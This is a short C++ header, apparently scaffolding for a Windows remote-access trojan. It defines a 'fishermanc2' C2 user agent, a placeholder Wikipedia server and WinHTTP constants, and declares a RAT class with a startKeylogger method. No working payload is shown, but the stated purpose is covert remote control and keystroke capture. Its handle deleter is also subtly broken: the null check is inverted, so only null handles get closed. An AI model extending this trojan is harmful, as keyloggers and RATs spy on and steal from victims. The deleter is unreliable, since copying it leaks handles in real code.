#pragma once

#include <Windows.h>
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

#define DEFAULT_HTTP_VERSION NULL
#define RESERVED NULL

namespace HTTPInfo {
	static const std::wstring FISHERMAN_USER_AGENT(L"fishermanc2/1.0");
	static const std::wstring TEMP_SERVER_NAME(L"en.wikipedia.org");
	static const std::wstring REQUESTED_RESOURCE(L"/wiki/Wikipedia:Random");
	constexpr int ZERO_LENGTH = 0;
	constexpr int NO_FLAGS = 0;
	constexpr int NO_CONTEXT = 0;

	namespace Methods {
		static const std::wstring GET(L"GET");
	}
}

struct HINTERNETDeleter {
	typedef HINTERNET pointer;

	void operator()(HINTERNET h) {
		if (!h) {
			WinHttpCloseHandle(h);
		}
	}
};

using HINTERNETWrapper = std::unique_ptr<HINTERNET, HINTERNETDeleter>;

class RAT {
public:
	RAT() = default;
	void startKeylogger();
};